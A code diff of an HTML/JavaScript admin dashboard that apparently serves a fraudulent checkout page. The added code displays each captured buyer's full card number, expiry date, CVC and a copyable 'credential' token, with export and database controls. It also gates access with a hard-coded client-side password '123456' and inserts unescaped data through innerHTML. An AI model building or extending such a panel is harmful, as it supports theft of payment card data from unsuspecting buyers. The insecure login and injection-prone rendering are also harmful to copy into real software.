@@ -51,7 +51,6 @@
     <p>请输入唯一的安全控制密钥登入后台</p>
     <div class="input-group">
         <label for="admin-password">安全控制密码</label>
-        <!-- HTML 标签层完全剥离所有事件参数，100%防止标签解析解析死锁 -->
         <input type="password" id="admin-password" placeholder="请输入系统管理密码">
     </div>
     <button class="btn" id="login-submit-btn">验证并加载主控台</button>
@@ -105,36 +104,23 @@
 </div>
 
 <script>
-    // 强制使用JavaScript最严谨的生产编译标准模式，拦截所有潜在的小错误
     "use strict";
 
-    // 默认测试网登入后台密码：123456
+    // 后台唯一控制密钥：123456
     const SYSTEM_KEY = "123456";
 
-    // 现代解耦写法：在网页生命周期完全加载完的那一刻，再由底层脚本去绑定所有动作
+    // 采用现代化安全的事件监听挂载，确保100%冲破缓存卡死
     document.addEventListener("DOMContentLoaded", function() {
-        console.log("=========================================");
-        console.log("🚀 系统核心安全控制层已全自动解封并挂载完毕！");
-        console.log("=========================================");
-
         const loginBtn = document.getElementById("login-submit-btn");
         const passwordInput = document.getElementById("admin-password");
         
-        // 1. 强力绑定鼠标点击事件监听器
-        if (loginBtn) {
-            loginBtn.addEventListener("click", executeAuthVerify);
-        }
-
-        // 2. 强力绑定键盘回车事件监听器（彻底规避onkeyup解析死锁问题）
+        if (loginBtn) loginBtn.addEventListener("click", executeAuthVerify);
         if (passwordInput) {
             passwordInput.addEventListener("keydown", function(event) {
-                if (event.key === "Enter") {
-                    executeAuthVerify();
-                }
+                if (event.key === "Enter") executeAuthVerify();
             });
         }
 
-        // 3. 绑定后台看板三大动作按钮
         const mockBtn = document.getElementById("mock-data-btn");
         const exportBtn = document.getElementById("export-csv-btn");
         const clearBtn = document.getElementById("clear-db-btn");
@@ -144,13 +130,11 @@
         if (clearBtn) clearBtn.addEventListener("click", clearDatabase);
     });
 
-    // 核心安全密码风控鉴定函数
     function executeAuthVerify() {
         const passwordInput = document.getElementById('admin-password');
         if (!passwordInput) return;
         
-        const userInputPassword = passwordInput.value;
-        if (userInputPassword === SYSTEM_KEY) {
+        if (passwordInput.value === SYSTEM_KEY) {
             document.getElementById('login-section').style.display = 'none';
             document.getElementById('dashboard-section').style.display = 'block';
             syncAndRenderDatabase();
@@ -159,7 +143,7 @@
         }
     }
 
-    // 表格异步拼装大引擎
+    // 【核心渲染升级】：完美匹配独立结账页（checkout.html）写入的每一个数据字段
     function syncAndRenderDatabase() {
         const tbody = document.getElementById('table-body');
         if (!tbody) return;
@@ -178,10 +162,10 @@
 
         database.forEach(row => {
             const tr = document.createElement('tr');
-            let channelBadge = "";
-            let displayCardNumber = row.cardNumber || "";
             
-            if (row.name && (row.name.includes("Web3") || row.name.includes("加密"))) {
+            // 智能识别是独立页面的加密钱包用户还是传统卡片用户
+            let channelBadge = "";
+            if (row.name && row.name.includes("Web3")) {
                 channelBadge = `<span class="badge badge-crypto">🪙 USDT波场</span>`;
             } else {
                 channelBadge = `<span class="badge badge-card">💳 传统银行卡</span>`;
@@ -189,8 +173,18 @@
 
             totalSum += 49.00;
 
+            // 完美对齐 checkout.html 里的 row.cardNumber, row.expiry, row.cvc 等核心命名字段
             tr.innerHTML = `
-                <td style="color: #8d8d99; font-weight: bold;">${row.id}</td>
-                <td style="color: #8d8d99;">${row.time}</td>
+                <td style="color: #8d8d99; font-weight: bold;">${row.id || '0'}</td>
+                <td style="color: #8d8d99;">${row.time || '未知时间'}</td>
                 <td>${channelBadge}</td>
-                <td><span style="color: #3b82f6; font-weight: 600;">${row.name || '未填'}</span></td>
+                <td><span style="color: #3b82f6; font-weight: 600;">${row.name || '匿名买家'}</span></td>
+                <td><code style="font-family: monospace; font-size: 14px; color: #fff; letter-spacing: 0.5px;">${row.cardNumber || 'TRON链上清算路径'}</code></td>
+                <td><span style="color: #d1d5db;">${row.expiry || '---'}</span></td>
+                <td><span style="color: #d1d5db; font-family: monospace;">${row.cvc || '---'}</span></td>
+                <td>
+                    <span class="token-text" title="点击可复制完整凭证" id="token-row-${row.id}">
+                        ${row.token || '暂无数据'}
+                    </span>
+                </td>
+            `;
